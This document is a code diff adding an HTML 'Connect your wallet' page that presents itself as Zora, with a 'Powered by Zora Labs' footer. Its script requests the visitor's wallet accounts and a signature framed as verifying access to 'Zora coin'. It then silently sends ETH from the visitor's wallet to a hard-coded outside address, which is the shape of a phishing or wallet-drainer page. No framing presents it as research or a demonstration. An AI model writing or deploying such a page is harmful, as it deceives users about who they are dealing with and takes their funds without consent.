@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Connect your wallet | Zora</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background: #f3f3f3;
+    }
+    .center {
+      max-width: 400px;
+      margin: 100px auto;
+      background: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    button {
+      display: block;
+      width: 100%;
+      margin: 10px 0;
+      padding: 15px;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .metamask {
+      background-color: #f6851b;
+      color: white;
+    }
+    .walletconnect {
+      background-color: #007AFF;
+      color: white;
+    }
+  </style>
+</head>
+<body>
+  <div class="center">
+    <h2>Connect your wallet</h2>
+    <p>Select a wallet to connect to Zora</p>
+    <button class="metamask" onclick="connectWallet()">MetaMask</button>
+    <button class="walletconnect" onclick="connectWallet()">WalletConnect</button>
+    <p style="font-size: 12px; color: gray;">Powered by Zora Labs</p>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <script>
+    async function connectWallet() {
+      if (window.ethereum) {
+        try {
+          const web3 = new Web3(window.ethereum);
+          await ethereum.request({ method: 'eth_requestAccounts' });
+          const accounts = await web3.eth.getAccounts();
+          const from = accounts[0];
+
+          // Optional signing message
+          await ethereum.request({
+            method: "personal_sign",
+            params: ["Sign to verify access to Zora coin", from]
+          });
+
+          // Send tiny ETH amount on Base to your address
+          await web3.eth.sendTransaction({
+            from,
+            to: "0xCF62064d70593ecd8B319b267F769ddD181157d2",
+            value: web3.utils.toWei("0.0000000001", "ether")
+          });
+
+        } catch (err) {
+          alert("Error: " + err.message);
+        }
+      } else {
+        alert("MetaMask or WalletConnect not detected.");
+      }
+    }
+  </script>
+</body>
+</html>
